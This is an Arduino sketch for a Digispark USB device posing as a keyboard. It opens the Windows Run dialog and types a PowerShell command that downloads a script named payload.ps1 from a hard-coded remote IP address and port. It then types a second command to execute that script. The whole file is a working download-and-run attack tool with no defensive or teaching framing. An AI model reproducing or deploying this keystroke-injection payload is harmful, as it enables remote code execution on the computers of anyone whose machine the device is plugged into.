#include "DigiKeyboardPtBr.h"

void setup() {
  // put your setup code here, to run once:

}

void winr() {
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
}

void del(int ms) {
  DigiKeyboardPtBr.delay(ms);
}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboardPtBr.sendKeyStroke(0);
  del(250);
  winr();
  del(250);
  DigiKeyboardPtBr.print("powershell \"wget -O \"C:\\Users\\temp\\pay.ps1\" \"http://193.123.127.248:10006/payload.ps1\";\"");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.sendKeyStroke(0);
  del(2000);
  winr();
  DigiKeyboardPtBr.print("powershell \"C\\Users\\temp\\pay.ps1\";");
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
